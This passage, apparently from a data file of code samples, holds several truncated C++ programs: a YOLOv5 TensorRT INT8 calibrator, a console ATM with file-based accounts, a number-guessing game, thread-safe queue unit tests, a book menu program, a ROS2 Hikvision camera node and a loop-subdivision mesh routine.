\u83b7\u53d6\u6821\u51c6\u56fe\u50cf\u96c6\u4e2d\u6240\u6709\u56fe\u50cf\u8def\u5f84,\u5e76\u5bf9\u9f50batchsize\n        get_file_paths(this->calibrator_image_dir,\n                       this->calibrator_image_paths,\n                       IMAGE_EXTS);\n        this->calibrator_image_paths.resize(static_cast<int>(this->calibrator_image_paths.size() / this->batch_size) * this->batch_size);\n        std::random_shuffle(this->calibrator_image_paths.begin(), this->calibrator_image_paths.end(),\n                            [](int i) { return rand() % i; });\n    }\n\n    //\u521d\u59cb\u5316\u8f93\u5165\u5f20\u91cf\n    CUDA_CHECK(cudaMalloc(&this->input, this->batch_size*this->input_size*sizeof(float)));\n}\n\n\n/**\n * @brief \u8fd9\u662fYOLOv5\u6a21\u578bTensorRT\u6821\u51c6\u7c7b\u7684\u6790\u9020\u51fd\u6570\n */\nYOLOv5Int8EntropyCalibrator::~YOLOv5Int8EntropyCalibrator() {\n    // \u91ca\u653e\u8d44\u6e90\n    std::vector<std::string>().swap(this->calibrator_image_paths);\n    std::vector<char>().swap(calibrator_cache);\n    CUDA_CHECK(cudaFree(this->input));\n}\n\n/**\n * @brief \u8fd9\u662f\u83b7\u53d6\u83b7\u53d6\u5c0f\u6279\u91cf\u6570\u636e\u89c4\u6a21\u7684\u51fd\u6570\n * @return \u5c0f\u6279\u91cf\u6570\u636e\u89c4\u6a21\n */\nint YOLOv5Int8EntropyCalibrator::getBatchSize() const TRT_NOEXCEPT {\n    return this->batch_size;\n}\n\n\n/**\n * @brief \u8fd9\u662fYOLOv5\u6a21\u578b\u56fe\u50cf\u9884\u5904\u7406\u51fd\u6570\n * @param image \u56fe\u50cf\n * @return \u9884\u5904\u7406\u540e\u7684\u56fe\u50cf\u5f20\u91cf\n */\ncv::Mat YOLOv5Int8EntropyCalibrator::preprocess(cv::Mat image) {\n    int image_channel = image.channels();\n    // \u56fe\u50cfresize\n    cv::Mat input_image;\n    input_image = opencv_resize_image(image,this->input_width,this->input_height);\n    // bgr2rgb\n    cv::cvtColor(input_image, input_image, cv::COLOR_BGR2RGB);\n//    // \u56fe\u50cf\u5f52\u4e00\u5316\n//    input_image.convertTo(input_image, CV_32FC3,1./255);\n//    // nhwc\u8f6cnchw\n//    std::vector<float> image_data = hwc2chw(input_image);\n    // if(image_channel==3){\n    //     input_image.convertTo(input_image, CV_32FC3);\n    // } else{\n    //     input_image.convertTo(input_image, CV_32FC1);\n    // }\n\n    // \u56fe\u50cf\u5f52\u4e00\u5316\n    if(this->use_normlize) {\n        // ONNX\u6a21\u578b\u5b58\u5728\u5f52\u4e00\u5316\u64cd\u4f5c\uff0c\u5219\u4e0d\u505aopencv\u5f52\u4e00\u5316\u64cd\u4f5c\n        if(image_channel==3){\n            input_image.convertTo(input_image, CV_32FC3);\n        } else{\n            input_image.convertTo(input_image, CV_32FC1);\n        }\n    }else{\n        // ONNX\u6a21\u578b\u4e0d\u5b58\u5728\u5f52\u4e00\u5316\u64cd\u4f5c\uff0c\u5219\u505aopencv\u5f52\u4e00\u5316\u64cd\u4f5c\n        if(image_channel==3){\n            input_image.convertTo(input_image, CV_32FC3,1./255);\n        } else{\n            input_image.convertTo(input_image, CV_32FC1,1./255);\n        }\n    }\n\n    // hwc2chw\n    cv::Mat input_tensor;\n    if(this->is_nchw) {         // nchw\u8f93\u5165\u5219\u9700\u8981\u505aopencv\u7684hwc2chw\u64cd\u4f5c\n        input_tensor = hwc2chw(input_image);\n    }else {                     // nhwc\u8f93\u5165\u5219\u4e0d\u9700\u8981\u505aopencv\u7684hwc2chw\u64cd\u4f5c\n        input_tensor = input_image;\n    }\n    return input_tensor;\n}\n\n/**\n * @brief \u8fd9\u662f\u83b7\u53d6\u4e00\u4e2a\u6279\u6b21\u8f93\u5165\u6570\u636e\u7684\u51fd\u6570\n * @param bindings\n * @param names\n * @param nbBindings\n * @return\n */\nbool YOLOv5Int8EntropyCalibrator::getBatch(void **bindings,const char *names[], int nbBindings) TRT_NOEXCEPT {\n    if (this->image_index + this->batch_size > this->calibrator_image_paths.size()) {\n        spdlog::info(\"\u6279\u91cf\u56fe\u50cf\u4e0b\u6807\u8d8a\u754c\uff0cimage_index={}\",this->image_index);\n        return false;\n    }\n    \n    // \u904d\u5386\u6240\u6709\u6821\u51c6\u56fe\u7247\uff0c\u505a\u6570\u636e\u9884\u5904\u7406\n    float* input_tensor = new float[this->batch_size*this->input_size];\n    memset(input_tensor,0,this->batch_size*this->input_size*sizeof(float));\n    for(int i = 0 ; i < this->batch_size ; i++){\n        // \u52a0\u8f7d\u56fe\u50cf\u5e76\u4f5c\u56fe\u50cf\u9884\u5904\u7406\n        cv::Mat image = cv::imread(this->calibrator_image_paths[this->image_index]);\n//        std::vector<float",
    "#include<bits/stdc++.h>\nusing namespace std;\n\n// Transaction class to store details of each transaction\nclass Transaction {\npublic:\n    string type;   // \"Deposit\" or \"Withdraw\"\n    double amount;\n    double balanceAfterTransaction;\n\n    Transaction(string t, double amt, double bal) {\n        type = t;\n        amount = amt;\n        balanceAfterTransaction = bal;\n    } \n};\n\n// Account class to represent bank accounts\nclass Account {\nprivate:\n    string accountNumber, accountHolderName, pin;\n    double balance;\n    vector<Transaction> transactionHistory;\n\npublic:\n    Account(string accNumber, string name, string accountPin, double initialBalance) {\n        accountNumber = accNumber;\n        accountHolderName = name;\n        pin = accountPin;\n        balance = initialBalance;\n    }\n\n    string getAccountNumber() { return accountNumber; }\n    string getPIN() { return pin; }\n    bool verifyPIN(string enteredPin) { return pin == enteredPin; }\n    \n    // Changing PIN\n    void changePIN(string newPin) {\n        pin = newPin;\n        cout << \"PIN changed successfully.\" << endl;\n    }\n\n    // Deposit operation\n    void deposit(double amount) {\n        balance += amount;\n        transactionHistory.push_back(Transaction(\"Deposit\", amount, balance));\n        cout << \"Deposit successful. Current balance: $\" << balance << endl;\n    }\n\n    // Withdraw operation\n    void withdraw(double amount) {\n        if (amount <= balance) {\n            balance -= amount;\n            transactionHistory.push_back(Transaction(\"Withdrawal\", amount, balance));\n            cout << \"Withdrawal successful. Current balance: $\" << balance << endl;\n        } else {\n            cout << \"Insufficient balance!\" << endl;\n        }\n    }\n\n    // Checking balance\n    void checkBalance() {\n        cout << \"Account holder: \" << accountHolderName << endl;\n        cout << \"Current balance: $\" << balance << endl;\n    }\n\n    // Display the  transaction history\n    void showTransactionHistory() {\n        if (transactionHistory.empty()) {\n            cout << \"No transactions yet.\" << endl;\n        } else {\n            cout << \"Transaction history for \" << accountHolderName << \":\" << endl;\n            for (auto& transaction : transactionHistory) {\n                cout << transaction.type << \": $\" << transaction.amount \n                 << \" | Balance after: $\" << transaction.balanceAfterTransaction << endl;\n            }\n        }\n    }\n\n    // Save account details in file\n    void saveToFile(ofstream &file) {\n        file << accountNumber << \",\" << accountHolderName << \",\" << pin << \",\" << balance << endl;\n    }\n\n    // Update balance and PIN of the user in the file\n    void updateFile() {\n        vector<Account> accounts = loadAccountsFromFile();\n        ofstream file(\"accounts.txt\");\n        for (Account& acc : accounts) {\n            if (acc.getAccountNumber() == this->accountNumber) {\n                acc.balance = this->balance;\n                acc.pin = this->pin;\n            }\n            acc.saveToFile(file);\n        }\n        file.close();\n    }\n\n    // Load the accounts stored in  file\n    static vector<Account> loadAccountsFromFile() {\n        vector<Account> accounts;\n        ifstream file(\"accounts.txt\");\n        if (!file.is_open()) return accounts;\n\n        string line;\n        while (getline(file, line)) {\n            stringstream ss(line);\n            string accountNumber, name, pin;\n            double balance;\n            getline(ss, accountNumber, ',');\n            getline(ss, name, ',');\n            getline(ss, pin, ',');\n            ss >> balance;\n            accounts.emplace_back(accountNumber, name, pin, balance);\n        }\n        file.close();\n        return accounts;\n    }\n};\n\n// ATM class to handle multiple accounts\nclass ATM {\nprivate:\n    vector<Account> accounts;\n\npublic:\n    ATM() {\n        // Load all accounts stored in file on ATM initialization\n        accounts = Account::loadAccountsFromFile();\n    }\n\n    // Create a new account in the bank\n    void createNewAccount() {\n        string accountNumber, accountHolderName, pin;\n        double initialDeposit;\n        cout << \"Enter account number: \"; cin >> accountNumber;\n        cout << \"Enter account holder name: \";\n        cin.ignore();\n        getline(cin, accountHolderName);\n        cout << \"Enter 4-digit PIN: \";\n        cin >> pin;\n        cout << \"Enter initial deposit: \";\n        cin >> initialDeposit;\n\n        Account newAccount(accountNumber, accountHolderName, pin, initialDeposit);\n        accounts.push_back(newAccount);\n\n        ofstream file(\"accounts.txt\", ios::app);\n        if (file.is_open()) {\n            newAccount.saveToFile(file);\n            file.close();\n            cout << \"Account created successfully!\" << endl;\n        }\n    }\n\n    // Function to search the account by account number\n    Account* findAccount(string accountNumber) {\n        for (auto& account : accounts) {\n            if (account.getAccountNumber()==accountNumber) {\n                return &ac",
    "#include <iostream>\n#include <cstdlib>\n#include <ctime>\n\n#define COLOR_GREEN \"\\x1b[32m\"\n#define COLOR_YELLOW \"\\x1b[33m\"\n#define COLOR_RED \"\\x1b[31m\"\n#define COLOR_BLUE \"\\x1b[34m\"\n#define COLOR_CYAN \"\\x1b[36m\"\n#define COLOR_RESET \"\\x1b[0m\"\n\nusing namespace std;\n\nvoid printWelcomeMessage()\n{\n    cout << \"========================================\\n\";\n    cout << \"         Welcome to The Final Brain Cell!   \\n\";\n    cout << \"========================================\\n\";\n    cout << \"Guess the number before you lose all your brain cells!\\n\\n\";\n}\n\nint generateRandomNumber(int maxNumber)\n{\n    srand(static_cast<unsigned int>(time(0))); // Seed random number generator\n    return rand() % maxNumber + 1;             // Random number between 1 and maxNumber\n}\n\nvoid chooseDifficulty(int &maxNumber, int &attemptsLeft)\n{\n    int choice;\n    cout << \"Choose your difficulty level:\\n\";\n    cout << COLOR_GREEN \"1. Easy (Number between 1 and 10, 7 attempts)\\n\" COLOR_RESET;\n    cout << COLOR_YELLOW \"2. Medium (Number between 1 and 20, 5 attempts)\\n\" COLOR_RESET;\n    cout << COLOR_RED \"3. Hard (Number between 1 and 50, 3 attempts)\\n\" COLOR_RESET;\n    cout << \"Enter your choice (1, 2, or 3): \" COLOR_CYAN;\n    cin >> choice;\n    cout << COLOR_RESET;\n\n    switch (choice)\n    {\n    case 1:\n        maxNumber = 10;\n        attemptsLeft = 7;\n        break;\n    case 2:\n        maxNumber = 20;\n        attemptsLeft = 5;\n        break;\n    case 3:\n        maxNumber = 50;\n        attemptsLeft = 3;\n        break;\n    default:\n        cout << \"Invalid choice. Defaulting to \" COLOR_YELLOW \"Medium\" COLOR_RESET \" difficulty.\\n\";\n        maxNumber = 50;\n        attemptsLeft = 5;\n    }\n}\n\nint calculateScore(int attemptsLeft, int maxAttempts)\n{\n    return (attemptsLeft * 100) / maxAttempts;\n}\n\nint main()\n{\n    printWelcomeMessage();\n\n    int maxNumber;\n    int attemptsLeft;\n    chooseDifficulty(maxNumber, attemptsLeft);\n\n    int maxAttempts = attemptsLeft; // Store the initial number of attempts for scoring\n    int secretNumber = generateRandomNumber(maxNumber);\n    int guess;\n\n    while (attemptsLeft > 0)\n    {\n        cout << \"Enter your guess: \" COLOR_CYAN;\n        cin >> guess;\n        cout << COLOR_RESET;\n\n        if (guess == secretNumber)\n        {\n            cout << COLOR_BLUE \"Congratulations! You've guessed the correct number!\\n\";\n            int score = calculateScore(attemptsLeft, maxAttempts);\n            cout << \"Your score: \" << score << \" points\\n\" COLOR_RESET;\n            break;\n        }\n        else if (guess < secretNumber)\n        {\n            cout << \"Too low! You lost a brain cell.\\n\";\n        }\n        else\n        {\n            cout << \"Too high! You lost a brain cell.\\n\";\n        }\n\n        attemptsLeft--;\n\n        if (attemptsLeft > 0)\n        {\n            cout << \"You have \" << attemptsLeft << \" brain cells left.\\n\";\n        }\n        else\n        {\n            cout << \"Oh no! You've lost all your brain cells!\\n\";\n            cout << \"The correct number was: \" << secretNumber << \"\\n\";\n            cout << \"Your score: 0 points\\n\";\n        }\n    }\n\n    cout << \"Game Over! Thanks for playing The Final Brain Cell.\\n\";\n\n    return 0;\n}\n",
    "#include <gtest/gtest.h>\n\n#include <thread>\n\n#include \"thread_safe_queue.h\"\n\n// Test Case 1: tryPush and tryPop success\nTEST(ThreadSafeQueue, PushAndPopSuccessTest)\n{\n    core::ThreadSafeQueue<int> queue(3);\n    int value;\n\n    // Pushing elements successfully\n    EXPECT_TRUE(queue.tryPush(1));\n    EXPECT_TRUE(queue.tryPush(2));\n    EXPECT_TRUE(queue.tryPush(3));\n\n    // Popping elements and verifying FIFO order\n    EXPECT_TRUE(queue.tryPop(value));\n    EXPECT_EQ(value, 1);\n    EXPECT_TRUE(queue.tryPop(value));\n    EXPECT_EQ(value, 2);\n    EXPECT_TRUE(queue.tryPop(value));\n    EXPECT_EQ(value, 3);\n}\n\n// Test Case 2: tryPush failure\nTEST(ThreadSafeQueue, PushFailureTest)\n{\n    core::ThreadSafeQueue<int> queue(2);\n\n    EXPECT_TRUE(queue.tryPush(1));\n    EXPECT_TRUE(queue.tryPush(2));\n\n    // Attempt to push an element when the queue is full\n    EXPECT_FALSE(queue.tryPush(3));\n}\n\n// Test Case 3: tryPop failure\nTEST(ThreadSafeQueue, PopFailureTest)\n{\n    core::ThreadSafeQueue<int> queue(2);\n\n    int value;\n    // Attempt to pop an element from an empty queue\n    EXPECT_FALSE(queue.tryPop(value));\n}\n\n// Test Case 4: tryPush and tryPop until failure\nTEST(ThreadSafeQueue, PushAndPopUntilFailureTest)\n{\n    core::ThreadSafeQueue<int> queue(2);\n    int value;\n\n    // Pushing more elements than the queue size is\n    EXPECT_TRUE(queue.tryPush(1));\n    EXPECT_TRUE(queue.tryPush(2));\n    EXPECT_FALSE(queue.tryPush(3));\n\n    // Popping elements even if the queue is empty\n    EXPECT_TRUE(queue.tryPop(value));\n    EXPECT_TRUE(queue.tryPop(value));\n    EXPECT_FALSE(queue.tryPop(value));\n}\n\n// Test Case 5: concurrent push test\nTEST(ThreadSafeQueue, ConcurrentPushTest)\n{\n    const size_t queueSize = 10;\n    core::ThreadSafeQueue<int> queue(queueSize);\n    const size_t numThreads = 5;\n    const size_t numPushesPerThread = 20;\n    std::vector<std::thread> threads;\n    std::atomic<size_t> successfulPushes(false);\n\n    // Create and launch producer threads\n    for (size_t i = 0; i < numThreads; ++i)\n    {\n        threads.emplace_back(\n            [&]()\n            {\n                for (size_t j = 0; j < numPushesPerThread; ++j)\n                {\n                    if (queue.tryPush(j))\n                    {\n                        successfulPushes++;\n                    }\n                }\n            });\n    }\n\n    for (auto& thread : threads)\n    {\n        thread.join();\n    }\n\n    // The number of successful pushes should not exceed the queue size\n    EXPECT_LE(successfulPushes.load(), queueSize);\n}\n\n// Test Case 6: concurrent pop test\nTEST(ThreadSafeQueue, ConcurrentPopTest)\n{\n    const size_t queueSize = 10;\n    core::ThreadSafeQueue<int> queue(queueSize);\n\n    for (int i = 0; i < queueSize; ++i)\n    {\n        EXPECT_TRUE(queue.tryPush(i));\n    }\n\n    const size_t numThreads = 5;\n    std::vector<std::thread> threads;\n    std::atomic<size_t> successfulPops(false);\n\n    // Create and launch consumer threads\n    for (size_t i = 0; i < numThreads; ++i)\n    {\n        threads.emplace_back(\n            [&]()\n            {\n                int value;\n                while (queue.tryPop(value))\n                {\n                    successfulPops++;\n                }\n            });\n    }\n\n    // Join threads\n    for (auto& thread : threads)\n    {\n        thread.join();\n    }\n\n    // The number of successful pops should match the queue size\n    EXPECT_EQ(successfulPops.load(), queueSize);\n}\n\n// Test Case 7: empty queue under concurrent pop test\nTEST(ThreadSafeQueue, EmptyQueueConcurrentPopTest)\n{\n    core::ThreadSafeQueue<int> queue(5);\n    const size_t numThreads = 5;\n    std::vector<std::thread> threads;\n    std::atomic<size_t> failedPops(false);\n\n    // Create and launch consumer threads\n    for (size_t i = 0; i < numThreads; ++i)\n    {\n        threads.emplace_back(\n            [&]()\n            {\n                int value;\n                if (!queue.tryPop(value))\n                {\n                    failedPops++;\n                }\n            });\n    }\n\n    for (auto& thread : threads)\n    {\n        thread.join();\n    }\n\n    // All pops should fail\n    EXPECT_EQ(failedPops.load(), numThreads);\n}\n\n// Test Case 8: full queue under concurrent push test\nTEST(ThreadSafeQueue, FullQueueConcurrentPushTest)\n{\n    const size_t queueSize = 5;\n    core::ThreadSafeQueue<int> queue(queueSize);\n\n    for (int i = 0; i < queueSize; ++i)\n    {\n        EXPECT_TRUE(queue.tryPush(i));\n    }\n\n    const size_t numThreads = 5;\n    std::vector<std::thread> threads;\n    std::atomic<size_t> failedPushes(false);\n\n    // Create and launch producer threads\n    for (size_t i = 0; i < numThreads; ++i)\n    {\n        threads.emplace_back(\n            [&]()\n            {\n                if (!queue.tryPush(10))\n                {\n                    failedPushes++;\n                }\n            });\n    }\n\n    for (auto& thread : threads)\n    {\n        thread.join();\n    }\n\n    // All pushes should fail\n    EXPECT_EQ(failedPushes.load(), numThreads);\n}",
    "#include <iostream>\n#include <string>\nusing namespace std;\n\nclass Book \n{\nprivate:\n    string name;\n    string genre;\n    string author;\n    float price;\n    int pages;\n\npublic:\n    \n    Book() \n    {\n        name = \" \"; \n        genre = \"\";\n        author = \" \";\n        price = 0.0;\n        pages = 0;\n}\n\n    \n    Book(string n, string g, string a, float p, int page)\n        \n        \n    { \n        name = n;\n        genre=g;\n        author = a;\n        price = p;\n        pages = page; \n    }\n    void display()\n    {\n        cout << \"Book Name: \" << name << endl;\n        cout << \"Genre: \" << genre << endl;\n        cout << \"Author: \" << author << endl;\n        cout << \"Price: \" << price << endl;\n        cout << \"Pages: \" << pages << endl;\n    }\n\n      void updateDetails(string n, string g, string a, float p, int page)\n    {\n        name = n;\n        genre = g;\n        author = a;\n        price = p;\n        pages = page;\n    }\n\n    void applyDiscount(float discountPercentage)\n    {\n        price =price- (price * (discountPercentage / 100));\n    }\n\n};\n\nint main()\n{\n    Book book; \n    int choice;\n    char continueChoice;\n\n    do \n    {\n        \n        cout << \"Menu:\" << endl;\n        cout << \"1. Input Book Details\" << endl;\n        cout << \"2. Display Book\" << endl;\n        cout << \"3. Apply Discount\" << endl;\n        cout << \"4. Update Book Details\" << endl;\n        cout << \"5. Exit\" << endl;\n        cout << \"Enter your choice: \";\n        cin >> choice;\n         switch (choice)\n        {\n        case 1: \n        {\n            string name, genre, author;\n            float price;\n            int pages;\n\n            cout << \"Enter book name: \";\n            cin >> name;\n            cout << \"Enter genre: \";\n            cin >> genre;\n            cout << \"Enter author: \";\n            cin >> author;\n\n            \n            do \n            {\n                cout << \"Enter price (greater than equal 0): \";\n                cin >> price;\n            } while (price <= 0);\n          \n            do\n            {\n                cout << \"Enter number of pages (greater than 0): \";\n                cin >> pages;\n            } while (pages < 1 );\n\n           \n            Book newBook(name, genre, author, price, pages);\n            book = newBook;  \n            break;\n        }\n         case 2:\n        {\n            book.display();\n            break;\n        }\n        case 3: \n            {\n            float discountPercentage;\n            cout << \"Enter discount percentage: \";\n            cin >> discountPercentage;\n            book.applyDiscount(discountPercentage);\n            cout << \"Discount applied successfully.\" << endl;\n            break;\n        }\n        case 4:\n            {\n            string name, genre, author;\n            float price;\n            int pages;\n\n            cout << \"Update Book Details\" << endl;\n            cout << \"Enter new book name: \";\n            cin >> name;\n            cout << \"Enter new genre: \";\n            cin >> genre;\n            cout << \"Enter new author: \";\n            cin >> author;\n\n            \n            do {\n                cout << \"Enter price (greater than equal 0): \";\n                cin >> price;\n            } while (price <= 0);\n            do\n            {\n                cout << \"Enter new number of pages (greater than 0): \";\n                cin >> pages;\n            } while (pages < 1);\n\n            book.updateDetails(name, genre, author, price, pages);\n            cout << \"Book details updated successfully.\" << endl;\n            break;\n        }\n        case 5:\n            cout << \"Exiting...\" << endl;\n            break;\n        default:\n            cout << \"Invalid choice. Please try again.\" << endl;\n        }\n\n        \n        if (choice != 5) \n        {\n            cout << \"Do you want to continue? (y/n): \";\n            cin >> continueChoice;\n        }\n\n\n\n          } while (continueChoice == 'y' || continueChoice == 'Y');\n\n    return 0;\n}",
    "#include <hik_camera/hik_camera.h>\n// #include <rm_utils/common.h>\n// #include <rm_utils/frame_info.h>\n#include <unistd.h>\n\n#include <iostream>\n// #include <rm_utils/perf.hpp>\n#include <string>\n// \u5c1d\u8bd5func, \u5982\u679c\u8fd4\u56de\u503c\u4e0d\u662fMV_OK(\u53730)\u5219\u8c03\u7528logger\u8bb0\u5f55WARN\u65e5\u5fd7\n#define UPDBW(func)                                                                        \\\n    nRet = func;                                                                           \\\n    if (nRet != MV_OK) {                                                                   \\\n        RCLCPP_WARN(this->get_logger(), #func \" failed!, error code: %x\", (unsigned)nRet); \\\n    }\n\n// \u5c1d\u8bd5func, \u5982\u679c\u8fd4\u56de\u503c\u4e0d\u662fMV_OK(\u53730)\u5219\u8c03\u7528logger\u8bb0\u5f55FATAL\u65e5\u5fd7\n#define UPDBF(func)                                                                         \\\n    nRet = func;                                                                            \\\n    if (nRet != MV_OK) {                                                                    \\\n        RCLCPP_FATAL(this->get_logger(), #func \" failed!, error code: %x\", (unsigned)nRet); \\\n    }\n\n// \u5bf9\u4e8e\u4e0d\u53ef\u6062\u590d\u6027\u9519\u8bef\u91cd\u542f\u76f8\u673a\u8282\u70b9\n#define UPDBE(func)      \\\n    UPDBF(func)          \\\n    if (nRet != MV_OK) { \\\n        reset();         \\\n    }\n\nusing namespace hik_camera;\n\nHikCameraNode::HikCameraNode(const rclcpp::NodeOptions& options) : Node(\"hik_camera\", options) {\n    RCLCPP_INFO(this->get_logger(), \"Starting HikCameraNode!\");\n    declare_params();\n    bool use_sensor_data_qos = get_parameter(\"use_sensor_data_qos\").as_bool();\n    std::string camera_info_url = get_parameter(\"camera_info_url\").as_string();\n    // \u521b\u5efapub\n    bool use_intra = options.use_intra_process_comms();\n    if (!use_intra) {\n        RCLCPP_WARN(get_logger(), \"Not In Intra Process Mode\");\n    }\n    if (!use_sensor_data_qos) {\n        RCLCPP_WARN(get_logger(), \"Not Use Sensor Data Qos\");\n    }\n    auto qos = use_sensor_data_qos ? rmw_qos_profile_sensor_data : rmw_qos_profile_default;\n    image_pub = image_transport::create_camera_publisher(this, \"image\", qos);\n\n    // frame_id \u7531\u540d\u547d\u540d\u7a7a\u95f4\u51b3\u5b9a\n    auto ns = std::string_view(get_namespace());\n    auto ns_pos = ns.rfind('/');\n    if (ns_pos != std::string_view::npos && ns_pos + 1 < ns.size()) {\n        frame_id = ns.substr(ns.rfind('/') + 1);\n        frame_id.append(\"_frame\");\n    } else {\n        frame_id = \"default_camera_frame\";\n    }\n\n    // load camera info\n    camera_info_manager =\n        std::make_unique<camera_info_manager::CameraInfoManager>(this);\n    if (camera_info_manager->validateURL(camera_info_url)) {\n        camera_info_manager->loadCameraInfo(camera_info_url);\n        camera_info_msg = camera_info_manager->getCameraInfo();\n    } else {\n        RCLCPP_WARN(this->get_logger(), \"Invalid camera info URL: %s\",\n                    camera_info_url.c_str());\n    }\n    init_camera();\n    RCLCPP_WARN(get_logger(), \"Starting Camera Monitor thread.\");\n    monitor_on = true;\n    monitor_thread = std::thread(&HikCameraNode::monitor, this);\n\n    param_client = std::make_shared<rclcpp::AsyncParametersClient>(\n        this->get_node_base_interface(),\n        this->get_node_topics_interface(),\n        this->get_node_graph_interface(),\n        this->get_node_services_interface());\n    param_event_sub = param_client->on_parameter_event([this](const rcl_interfaces::msg::ParameterEvent::SharedPtr event) {\n        for (auto & new_param : event->new_parameters) {\n            RCLCPP_INFO(this->get_logger(), \"Param %s changed.\", new_param.name.c_str());\n        }\n        param_changed = true;\n    });\n};\n\nHikCameraNode::~HikCameraNode() {\n    monitor_on = false;\n    if (monitor_thread.joinable()) {\n        monitor_thread.join();\n    }\n    close_device();\n};\n\nvoid HikCameraNode::declare_params() {\n    this->declare_parameter(\"sn\", \"\");\n    // https://github.com/ros-perception/image_common/blob/136807edb7ff13452214a296fb4819bc63b5b09e/image_transport/src/camera_common.cpp#L62\n    this->declare_parameter(\"camera_info_url\", \"package://hik_camera/config/camera_info.yaml\");\n    this->declare_parameter(\"exposure_time\", 4000.0);\n    this->declare_parameter(\"gain\", 15.0);\n    this->declare_parameter(\"digital_shift\", 6.0);\n    this->declare_parameter(\"frame_rate\", 60.0);\n    this->declare_parameter(\"use_sensor_data_qos\", false);\n    rotate_180 = this->declare_parameter(\"rotate_180\", false);\n    if (rotate_180) {\n        RCLCPP_WARN(this->get_logger(), \"Rotate 180 degree\");\n    }\n}\n\nvoid HikCameraNode::init_camera() {\n    MV_CC_DEVICE_INFO_LIST device_list;\n    bool device_found = false;\n    while (!device_found && rclcpp::ok()) {\n        // \u679a\u4e3e\u8bbe\u5907\n        UPDBW(MV_CC_EnumDevices(MV_USB_DEVICE, &device_list));\n        std::string sn_to_find = get_parameter(\"sn\").as_string();\n        char device_sn[INFO_MAX_BUFFER_SIZE];\n        if (device_list.nDeviceNum > 0) {\n            if (get_parameter(\"sn\").as_string() == \"\") {\n                // \u672a\u8bbe\u7f6ecamera sn,\u9009\u62e9\u7b2c\u4e00\u4e2a\n                RCLCPP_WARN(this->get_logger(), \"Camera SN not set, use the first camera device\");\n                UPDBE(MV_CC_CreateHandle(&camera",
    "// loop-subdivision\n//\n// Author   : Omkar Vengurlekar (Arizona State University)\n// Email    : ovengurl@asu.edu\n\n#include <fstream>\n#include <vector>\n#include <cmath>\n#include <unordered_map>\n\n#include \"OBJFileReader.h\"\n#include \"Solid.h\"\n#include \"iterators.h\"\n#include \"SolidDelegate.h\"\n \nusing namespace MeshLib;\n\n\nint main(int argc, char *argv[])\n{\n\t// Read in the obj file\n\tSolid mesh;\n\tOBJFileReader of;\n\tstd::ifstream in(argv[1]);\n\tof.readToSolid(&mesh, in);\n\n\tSolid newMesh;\n\tint vid = 0;\n\tint fid = 0;\n\tSolidDelegate delegate;\n\n\tstd::unordered_map<Vertex*, Vertex*> vertexMap;\n\tfor ( SolidVertexIterator viter(&mesh); !viter.end(); ++viter){\n\t\tVertex *v = *viter;\n\t\tVertex *vNew = delegate.createVertex(&newMesh, ++vid);\n\n\t\tif (v->boundary()){\n\t\t\tstd::vector <Point > plist;\n\t\t\tHalfEdge *hedge = v->halfedge();\n\n\t\t\tif (hedge->edge()->boundary()){\n\t\t\t\tdo {\n\t\t\t\t\thedge = hedge->clw_rotate_about_target();\n\t\t\t\t} while (hedge->clw_rotate_about_target());\n\t\t\t\tif (hedge == hedge->edge()->halfedge(0)){\n\t\t\t\t\thedge = hedge->edge()->halfedge(1);\n\t\t\t\t}\n\t\t\t\telse if (hedge == hedge->edge()->halfedge(1)){\n\t\t\t\t\thedge = hedge->edge()->halfedge(0);\n\t\t\t\t}\n\t\t\t\thedge = hedge->clw_rotate_about_source();\n\t\t\t\tvNew->point() = v->point()*3/4 + (v->halfedge()->source()->point() + hedge->target()->point())/8;\n\t\t\t}\n\t\t\telse{\n\t\t\t\tdo { \n\t\t\t\t\thedge = hedge->ccw_rotate_about_target();\n\t\t\t\t\tplist.push_back(hedge->source()->point()); \n\t\t\t\t} while (!hedge->edge()->boundary());\n\t\t\t\tvNew->point() = v->point() * 3.0f / 4.0f + plist.back() / 8.0f;\n\t\t\t\tdo { \n\t\t\t\t\thedge = hedge->clw_rotate_about_target();\n\t\t\t\t\tplist.push_back(hedge->source()->point()); \n\t\t\t\t} while (hedge->clw_rotate_about_target());\n\t\t\t\tif (hedge == hedge->edge()->halfedge(0)){\n\t\t\t\t\thedge = hedge->edge()->halfedge(1);\n\t\t\t\t}\n\t\t\t\telse if (hedge == hedge->edge()->halfedge(1)){\n\t\t\t\t\thedge = hedge->edge()->halfedge(0);\n\t\t\t\t}\n\t\t\t\thedge = hedge->clw_rotate_about_source();\n\t\t\t\tvNew->point() = vNew->point() + hedge->target()->point() / 8.0f;\n\t\t\t}\n\t\t}\n\t\telse{\n\t\t\tstd::vector <Point > plist;\n\t\t\tHalfEdge *hedge = v->halfedge();\n\n\t\t\tint n = 0;\n\t\t\tdo {\n\t\t\t\tplist.push_back(hedge->source()->point());\n\t\t\t\thedge = hedge->clw_rotate_about_target();\n\t\t\t\tn++;\n\t\t\t} while (hedge != v->halfedge());\n\n\t\t\tfloat alpha;\n\t\t\tif (n > 3){\n\t\t\t\tfloat center = (0.375f + (0.25f * cos((2.0f * 3.1415926f) / (float)n)));\n\t\t\t\talpha = (0.625f - (center * center)) / (float)n;\n\t\t\t}\n\t\t\telse {\n\t\t\t\talpha = 3.0f / 16.0f;\n\t\t\t}\n\n\t\t\tPoint temp = { 0.0f, 0.0f, 0.0f };\n\t\t\tfor (int i = 0; i < n; i++){\n\t\t\t\ttemp += plist.back();\n\t\t\t\tplist.pop_back();\n\t\t\t}\n\t\t\tvNew->point() = v->point() *(1 - n*alpha) + temp.operator*(alpha);\n\t\t}\n\t\tvertexMap[v] = vNew;\n\t}\n\n\tstd::unordered_map<Edge*, Vertex*> edgeMap;\n\tSolidEdgeIterator eiter(&mesh);\n\tfor (; !eiter.end(); ++eiter){\n\t\tEdge *e = *eiter;\n\t\tVertex *ev1 = mesh.idVertex(e->vertex(0));\n\t\tVertex *ev2 = mesh.idVertex(e->vertex(1));\n\t\tVertex *vNew = delegate.createVertex(&newMesh, ++vid);\n\n\t\tif (e->boundary()){\n\t\t\tvNew->point() = (ev1->point() + ev2->point()) / 2.0f;\n\t\t}\n\t\telse{\n\t\t\tvNew->point() = (ev1->point() + ev2->point()) * 3.0f / 8.0f;\n\t\t\tVertex *vt1 = e->halfedge(0)->he_next()->target();\n\t\t\tVertex *vt2 = e->halfedge(1)->he_next()->target();\n\t\t\tvNew->point() = vNew->point() + (vt1->point() + vt2->point()) / 8.0f;\n\t\t}\n\t\tedgeMap[e] = vNew;\n\t} \n\n\tSolidFaceIterator faceiter(&mesh);\n\tfor(; !faceiter.end(); ++faceiter){\n\t\tFace *f = *faceiter;\n\t\tHalfEdge * 